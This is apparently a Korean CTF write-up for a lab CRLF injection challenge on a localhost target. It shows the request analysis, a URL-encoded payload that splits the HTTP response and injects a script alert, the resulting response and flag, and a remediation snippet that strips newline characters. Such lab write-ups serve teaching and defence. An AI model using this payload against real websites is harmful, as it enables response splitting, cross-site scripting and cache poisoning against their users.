+++
title = "VulnABLE CTF [LUXORA] Write-up: CRLF Injection 🥉 Bronze"
description = "LUXORA 플랫폼의 기본 CRLF 취약점을 이용한 HTTP 응답 분할(Response Splitting) 및 XSS 공격 롸잇업"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "CRLF Injection", "Bronze", "Response Splitting", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: CRLF Injection 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (CRLF Injection)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/crlf/bronze`
- **목표**: 사용자의 입력값이 HTTP 응답 헤더(Response Header)에 그대로 반영되는 취약점을 이용하여, HTTP 응답 분할(HTTP Response Splitting)을 유발하고 조작된 본문(Body)을 응답하게 하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 반응 분석 (Reconnaissance)

`/crlf/bronze` 경로에 접근하면 특정 파일을 다운로드하거나 언어를 설정하는 기능이 있습니다. 
여기서는 사용자가 URL 파라미터로 넘긴 언어 코드가 HTTP 응답 헤더인 `Set-Cookie`에 반영된다고 가정하겠습니다.

**[정상 요청 테스트]**
```http
GET /crlf/bronze?lang=en HTTP/1.1
Host: localhost:3000
```

**[서버의 정상 응답]**
```http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: language=en

<html><body>Welcome!</body></html>
```

**[해커의 사고 과정]**
1. 파라미터 `lang=en` 의 값이 응답 헤더인 `Set-Cookie: language=en` 에 그대로(Raw) 반영되고 있다.
2. HTTP 프로토콜은 헤더와 본문(Body)을 **두 번의 줄바꿈(CRLF CRLF, `\r\n\r\n`)**으로 구분한다.
3. 만약 내가 입력값에 `\r\n\r\n` 을 강제로 밀어 넣는다면, 원래 서버가 보내려던 본문을 밀어내고 내 마음대로 가짜 본문을 브라우저에 뿌려버릴 수 있지 않을까?

---

## 💥 2. 취약점 식별 및 페이로드 조립 (Exploitation)

목표는 가짜 응답 본문을 주입하여 사용자 브라우저에 "Hacked!" 라는 메시지와 함께 악성 스크립트를 띄우는 것입니다.

### 💡 페이로드 설계
URL 인코딩에서 `\r\n`은 `%0d%0a` 입니다.
두 번 연속 쓰면 헤더가 끝나고 본문이 시작됩니다: `%0d%0a%0d%0a`

**[주입할 값]**
`en\r\n\r\n<script>alert('Hacked!');</script>`

**[최종 URL 페이로드]**
```http
GET /crlf/bronze?lang=en%0d%0a%0d%0a%3Cscript%3Ealert('Hacked!')%3C%2Fscript%3E HTTP/1.1
```

---

## 🚀 3. 공격 수행 및 결과 확인

Burp Suite 또는 브라우저 주소창을 통해 해당 URL을 요청합니다.

### 🔍 조작된 서버의 응답
서버는 입력값을 의심 없이 헤더에 박아 넣었고, 그 결과 HTTP 응답이 두 조각으로 쪼개져 버렸습니다(Response Splitting).

```http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: language=en

<script>alert('Hacked!')</script>  <-- 여기서부터 본문으로 해석됨!
```

이 응답을 받은 희생자의 브라우저는 즉시 `alert('Hacked!')` 를 실행하게 됩니다. 이와 동시에 챌린지 성공 조건이 달성되어 플래그가 나타납니다.

```text
[!] System: Response splitting detected. Flag: FLAG{CRLF_🥉_SPLIT_XSS_F1A2B3}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

입력값에 대한 개행 문자(CRLF) 필터링이 누락되었을 때, 단순한 헤더 조작이 어떻게 브라우저를 속이는 거대한 XSS나 Cache Poisoning 공격으로 증폭될 수 있는지 확인했습니다.

**🔥 획득한 플래그:**
`FLAG{CRLF_🥉_SPLIT_XSS_F1A2B3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
사용자 입력을 HTTP 헤더(Location, Set-Cookie 등)에 세팅할 때 개행 문자를 제거하지 않은 것이 원인입니다.

* **안전한 패치 가이드 (개행 문자 제거)**
응답 헤더를 설정하기 전, 반드시 정규표현식을 통해 `\r` 과 `\n` 을 제거해야 합니다.
```javascript
// 입력값에서 CRLF 문자 제거
const safeLang = req.query.lang.replace(/[\r\n]/g, "");

// 안전하게 헤더 세팅
res.setHeader("Set-Cookie", `language=${safeLang}`);
```
현대의 많은 웹 프레임워크(최신 버전의 Express, Django 등)는 응답 헤더 설정 함수 내부에서 자체적으로 CRLF 문자를 필터링하거나 에러를 내뿜도록 방어 로직이 내장되어 있습니다. 프레임워크를 최신 버전으로 유지하는 것이 중요합니다.